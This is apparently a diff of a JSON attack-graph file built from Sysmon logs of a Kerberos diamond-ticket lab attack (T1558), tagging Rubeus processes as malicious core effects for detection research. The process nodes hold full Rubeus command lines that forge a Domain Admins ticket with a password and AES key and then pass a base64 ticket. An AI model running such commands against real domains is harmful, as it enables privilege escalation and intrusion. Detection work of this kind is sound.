@@ -2,7 +2,7 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1558",
-  "generated_at_utc": "2026-05-08T15:48:17.691297+00:00",
+  "generated_at_utc": "2026-05-08T16:40:34.794899+00:00",
   "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1558\\diamond_ticket\\sysmon.log",
   "source_files": [
     "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1558\\diamond_ticket\\sysmon.log"
@@ -12,7 +12,9 @@
       "rubeus.exe"
     ],
     "whitelist": [],
-    "core_effect": [],
+    "core_effect": [
+      "rubeus.exe"
+    ],
     "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1558_malcious_config.json"
   },
   "matching": {
@@ -20,33 +22,60 @@
       "Process:{7AF7D7EE-1652-651F-0E18-000000000E03}:1",
       "Process:{7AF7D7EE-165E-651F-0F18-000000000E03}:1"
     ],
-    "core_effect_node_ids": [],
+    "core_effect_node_ids": [
+      "Process:{7AF7D7EE-1652-651F-0E18-000000000E03}:1",
+      "Process:{7AF7D7EE-165E-651F-0F18-000000000E03}:1"
+    ],
     "whitelist_node_ids": [],
     "overlap_whitelist_override_node_ids": []
   },
   "nodes": [
     {
-      "id": "Process:{7AF7D7EE-158A-651F-D917-000000000E03}:1",
-      "label": "explorer.exe",
+      "id": "Process:{7AF7D7EE-1652-651F-0E18-000000000E03}:1",
+      "label": "rubeus",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "",
-        "guid": "{7AF7D7EE-158A-651F-D917-000000000E03}",
-        "pid": "3488",
-        "image_path": "%windir%\\explorer.exe",
-        "command_line": "%windir%\\explorer.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
+        "process_name": "rubeus",
+        "guid": "{7AF7D7EE-1652-651F-0E18-000000000E03}",
+        "pid": "388",
+        "image_path": "c:\\rubeus.exe",
+        "command_line": "rubeus.exe  diamond \\user:lowpriv \\password:mpw2tgc7eo7jaral2qc \\krbkey:8b605a4af251f69318fb5c23833f28a70dae789098f7be9ab59799975cab8f30 \\enctype:aes \\domain:attackrange.local \\ticketuser:lowpriv \\ticketuserid:1115 \\groups:512 \\nowrap",
+        "original_file_name": "rubeus.exe",
+        "image_hash": "MD5=4E8934FDBC97C614185AB23DBADD9D9B,SHA256=372660E89CBC2A8BA5CFD9C4FC2CA029364B7D22B5F8B04C9A9F2EE35BB6CAA7,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",
+        "command_hash": "d8d9fd1f4e31984175f7d5d817554a07620aa25e8dde945f7b6b4e33da025855",
+        "parent_process_id": "Process:{7AF7D7EE-1627-651F-0718-000000000E03}:1",
+        "user_id": "User:S-1-5-18",
         "event_id": "1",
-        "id": "Process:{7AF7D7EE-158A-651F-D917-000000000E03}:1",
+        "id": "Process:{7AF7D7EE-1652-651F-0E18-000000000E03}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "explorer.exe",
-        "name": "explorer.exe"
+        "display_name": "rubeus",
+        "name": "rubeus"
+      }
+    },
+    {
+      "id": "Process:{7AF7D7EE-165E-651F-0F18-000000000E03}:1",
+      "label": "rubeus",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "rubeus",
+        "guid": "{7AF7D7EE-165E-651F-0F18-000000000E03}",
+        "pid": "4268",
+        "image_path": "c:\\rubeus.exe",
+        "command_line": "rubeus.exe  asktgs \\service:cifs\\ar-win-dc.attackrange.local \\nowrap \\ptt \\ticket:doifzjccbcqgawibbaedagewooiextccbmfhggs9miieuaadageformbeufuvefds1jbtkdflkxpq0fmoiywjkadagecor0wgxsga3jidgd0gxfbvfrbq0tsqu5hrs5mt0nbtkocbhmwggrvoamcarkhawiba6kcbgeeggrdyjnagvhkjrdijzx3hayhnucqo\\gmabquotkmcbsdwf7zhdlzeosukndnzkdy0ls7mkn9ps+yivobg0rzparzplmowb5whbjxyf9phzqv+yat23hbgetg2zxxsfqpwho6hkqydajgp20rm2poljezk9maohkt6yxmut4yvyziyyoy68kdmveyqevodhjkghzmm8ddmjuhjlxsqpcguxhcswcwxo1ivpoesdaxcsqgnpflcjqddpefadktrxuexcf5kzo+e2+01nbpy1yvwkkuxexwfhwuca6zc\\hrynvwafkgnuwh1xc3nghlfspu4hlzyyj3ujdq9rzggdxmjo5mebcttuqm5a4wirggyz4odq14eliroicwilfop2u\\+7hp8vhg2rfih01+8hryezcisuvi7yrf2xgxa9zvsrwwrjjxiidqs\\zfhjkuwmctu2c\\89meyuj93jznrvvu4ezmwszrqbwy1lct5pftdp9tef+iugabbib0jgzvvbpq6+hx0rlvb3gba20jafxlojd32rdsbp+c1ugg5oksxaoyvcgvdbnpredxuorii5tizm6uwt6rsi5ckzbflg8atpz+cwzfz0h7g64qioj0wytfg++2bi3bylhnklj4llxxm1yrlcpk1cy2zaunxf+8aoh5nlcc1hnp2g0x8c6m5q\\eemjetiapqb9vrk0i\\uk8fdg3dbx4j\\ibwa\\xg6oltr7isi+lgrjx1rvbvtohawjdjwha9gh\\evif8+fdl8mov+dg5dqlepdr3qugpg7qohbmwgs1juzpbuoio8171wn7cn0i+wqsaahqpmtmwkfwekidzfrelxdvwk8ylggcqlya2h45hhcrjtdmap2ndisntq23qllabzmpjgfqe1xkag1iyvpj4d+hli+2txz7cnm0p0yx9voza1fz+gyxt4xwd2csr5krwctdzddjlvdyzuxbl\\z+l6fwexnzdzoekcgpksdibz6dx8y\\+fuktguaiwf\\5ebwlvj3qxiwrqbicpcdxe1fadk52+b0s6t4dxtvwtayreg6lyph1dxx8xkapbekyuz80wlrj8menc3prx3cahhbwlqgcb96lvvxm9gs+amwv+qch34qd0aoyzei5mz1wlxzx6npvocigfhricsyh1dpbjmo7y+hokessqzzzhxtzzbzyeqjfey8p5mhspdjdtl3l\\2cowd+xzutneplql3uqgahzvecxjt2uwbs+3bo7xzry3py6gtlfqllgzyaejllcy0qmfbip36a0fjqlq8mzv2ugkjgym5enuabpuwngzhx1fbq+rjppbv4jlj4bhly3kfyjuicjnyz5lz5sa3ug4pfhvdh9hfrp3gmopepn+uwr95yuxaxkooen52mel0cklb2wpcunqylklrwlakdknsh+kop7phbh7mow6d+2yxty8zrrdf\\6zw4fd99xymzjqb6lihj2pwsq5wawdbbxwmsojuf+3nviaob9dcb8aadageaoohpbihmfyhjmihgoihdmihamihxocswkaadagesosieibxsupqibnbjtv4abnwmztfcvkxngo6egkcmgpiggnfjormbeufuvefds1jbtkdflkxpq0fmohqweqadageboqswcrshbg93chjpdqmhawuaqoeaakurga8ymdizmtawntiwmdiynlqmergpmjaymzewmdywnjaymjzapxeydziwmjmxmdeymjawmji2wqgtgxfbvfrbq0tsqu5hrs5mt0nbtkkmmcsgawibaqedmbsbbmtyynrndbsrqvruqunlukfor0uute9dquw=",
+        "original_file_name": "rubeus.exe",
+        "image_hash": "MD5=4E8934FDBC97C614185AB23DBADD9D9B,SHA256=372660E89CBC2A8BA5CFD9C4FC2CA029364B7D22B5F8B04C9A9F2EE35BB6CAA7,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",
+        "command_hash": "74938bc6eaf38a22e13591acf2fe5d9b4c9941e825493bd380dc6cc0ff986baa",
+        "parent_process_id": "Process:{7AF7D7EE-1627-651F-0718-000000000E03}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{7AF7D7EE-165E-651F-0F18-000000000E03}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "rubeus",
+        "name": "rubeus"
       }
     },
     {
@@ -87,51 +116,27 @@
       }
     },
     {
-      "id": "Process:{7AF7D7EE-165E-651F-0F18-000000000E03}:1",
-      "label": "rubeus",
+      "id": "Process:{7AF7D7EE-158A-651F-D917-000000000E03}:1",
+      "label": "explorer.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "rubeus",
-        "guid": "{7AF7D7EE-165E-651F-0F18-000000000E03}",
-        "pid": "4268",
-        "image_path": "c:\\rubeus.exe",
-        "command_line": "rubeus.exe  asktgs \\service:cifs\\ar-win-dc.attackrange.local \\nowrap \\ptt \\ticket:doifzjccbcqgawibbaedagewooiextccbmfhggs9miieuaadageformbeufuvefds1jbtkdflkxpq0fmoiywjkadagecor0wgxsga3jidgd0gxfbvfrbq0tsqu5hrs5mt0nbtkocbhmwggrvoamcarkhawiba6kcbgeeggrdyjnagvhkjrdijzx3hayhnucqo\\gmabquotkmcbsdwf7zhdlzeosukndnzkdy0ls7mkn9ps+yivobg0rzparzplmowb5whbjxyf9phzqv+yat23hbgetg2zxxsfqpwho6hkqydajgp20rm2poljezk9maohkt6yxmut4yvyziyyoy68kdmveyqevodhjkghzmm8ddmjuhjlxsqpcguxhcswcwxo1ivpoesdaxcsqgnpflcjqddpefadktrxuexcf5kzo+e2+01nbpy1yvwkkuxexwfhwuca6zc\\hrynvwafkgnuwh1xc3nghlfspu4hlzyyj3ujdq9rzggdxmjo5mebcttuqm5a4wirggyz4odq14eliroicwilfop2u\\+7hp8vhg2rfih01+8hryezcisuvi7yrf2xgxa9zvsrwwrjjxiidqs\\zfhjkuwmctu2c\\89meyuj93jznrvvu4ezmwszrqbwy1lct5pftdp9tef+iugabbib0jgzvvbpq6+hx0rlvb3gba20jafxlojd32rdsbp+c1ugg5oksxaoyvcgvdbnpredxuorii5tizm6uwt6rsi5ckzbflg8atpz+cwzfz0h7g64qioj0wytfg++2bi3bylhnklj4llxxm1yrlcpk1cy2zaunxf+8aoh5nlcc1hnp2g0x8c6m5q\\eemjetiapqb9vrk0i\\uk8fdg3dbx4j\\ibwa\\xg6oltr7isi+lgrjx1rvbvtohawjdjwha9gh\\evif8+fdl8mov+dg5dqlepdr3qugpg7qohbmwgs1juzpbuoio8171wn7cn0i+wqsaahqpmtmwkfwekidzfrelxdvwk8ylggcqlya2h45hhcrjtdmap2ndisntq23qllabzmpjgfqe1xkag1iyvpj4d+hli+2txz7cnm0p0yx9voza1fz+gyxt4xwd2csr5krwctdzddjlvdyzuxbl\\z+l6fwexnzdzoekcgpksdibz6dx8y\\+fuktguaiwf\\5ebwlvj3qxiwrqbicpcdxe1fadk52+b0s6t4dxtvwtayreg6lyph1dxx8xkapbekyuz80wlrj8menc3prx3cahhbwlqgcb96lvvxm9gs+amwv+qch34qd0aoyzei5mz1wlxzx6npvocigfhricsyh1dpbjmo7y+hokessqzzzhxtzzbzyeqjfey8p5mhspdjdtl3l\\2cowd+xzutneplql3uqgahzvecxjt2uwbs+3bo7xzry3py6gtlfqllgzyaejllcy0qmfbip36a0fjqlq8mzv2ugkjgym5enuabpuwngzhx1fbq+rjppbv4jlj4bhly3kfyjuicjnyz5lz5sa3ug4pfhvdh9hfrp3gmopepn+uwr95yuxaxkooen52mel0cklb2wpcunqylklrwlakdknsh+kop7phbh7mow6d+2yxty8zrrdf\\6zw4fd99xymzjqb6lihj2pwsq5wawdbbxwmsojuf+3nviaob9dcb8aadageaoohpbihmfyhjmihgoihdmihamihxocswkaadagesosieibxsupqibnbjtv4abnwmztfcvkxngo6egkcmgpiggnfjormbeufuvefds1jbtkdflkxpq0fmohqweqadageboqswcrshbg93chjpdqmhawuaqoeaakurga8ymdizmtawntiwmdiynlqmergpmjaymzewmdywnjaymjzapxeydziwmjmxmdeymjawmji2wqgtgxfbvfrbq0tsqu5hrs5mt0nbtkkmmcsgawibaqedmbsbbmtyynrndbsrqvruqunlukfor0uute9dquw=",
-        "original_file_name": "rubeus.exe",
-        "image_hash": "MD5=4E8934FDBC97C614185AB23DBADD9D9B,SHA256=372660E89CBC2A8BA5CFD9C4FC2CA029364B7D22B5F8B04C9A9F2EE35BB6CAA7,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",
-        "command_hash": "74938bc6eaf38a22e13591acf2fe5d9b4c9941e825493bd380dc6cc0ff986baa",
-        "parent_process_id": "Process:{7AF7D7EE-1627-651F-0718-000000000E03}:1",
-        "user_id": "User:S-1-5-18",
+        "process_name": "",
+        "guid": "{7AF7D7EE-158A-651F-D917-000000000E03}",
+        "pid": "3488",
+        "image_path": "%windir%\\explorer.exe",
+        "command_line": "%windir%\\explorer.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
         "event_id": "1",
-        "id": "Process:{7AF7D7EE-165E-651F-0F18-000000000E03}:1",
+        "id": "Process:{7AF7D7EE-158A-651F-D917-000000000E03}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "rubeus",
-        "name": "rubeus"
-      }
-    },
-    {
-      "id": "Process:{7AF7D7EE-1652-651F-0E18-000000000E03}:1",
-      "label": "rubeus",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "rubeus",
-        "guid": "{7AF7D7EE-1652-651F-0E18-000000000E03}",
-        "pid": "388",
-        "image_path": "c:\\rubeus.exe",
-        "command_line": "rubeus.exe  diamond \\user:lowpriv \\password:mpw2tgc7eo7jaral2qc \\krbkey:8b605a4af251f69318fb5c23833f28a70dae789098f7be9ab59799975cab8f30 \\enctype:aes \\domain:attackrange.local \\ticketuser:lowpriv \\ticketuserid:1115 \\groups:512 \\nowrap",
-        "original_file_name": "rubeus.exe",
-        "image_hash": "MD5=4E8934FDBC97C614185AB23DBADD9D9B,SHA256=372660E89CBC2A8BA5CFD9C4FC2CA029364B7D22B5F8B04C9A9F2EE35BB6CAA7,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744",
-        "command_hash": "d8d9fd1f4e31984175f7d5d817554a07620aa25e8dde945f7b6b4e33da025855",
-        "parent_process_id": "Process:{7AF7D7EE-1627-651F-0718-000000000E03}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{7AF7D7EE-1652-651F-0E18-000000000E03}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "rubeus",
-        "name": "rubeus"
+        "display_name": "explorer.exe",
+        "name": "explorer.exe"
       }
     }
   ],
@@ -147,7 +152,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:48:17.690784+00:00"
+        "timestamp": "2026-05-08T16:40:34.794899+00:00"
       }
     },
     {
@@ -161,7 +166,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:48:17.691297+00:00"
+        "timestamp": "2026-05-08T16:40:34.794899+00:00"
       }
     },
     {
@@ -175,7 +180,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:48:17.691297+00:00"
+        "timestamp": "2026-05-08T16:40:34.794899+00:00"
       }
     },
     {
@@ -200,7 +205,7 @@
     "attack_edges": 4,
     "roots": 1,
     "matched_malicious_nodes": 2,
-    "core_effect_nodes": 0,
+    "core_effect_nodes": 2,
     "matched_whitelist_nodes": 0,
     "matched_overlap_whitelist_override_nodes": 0
   }
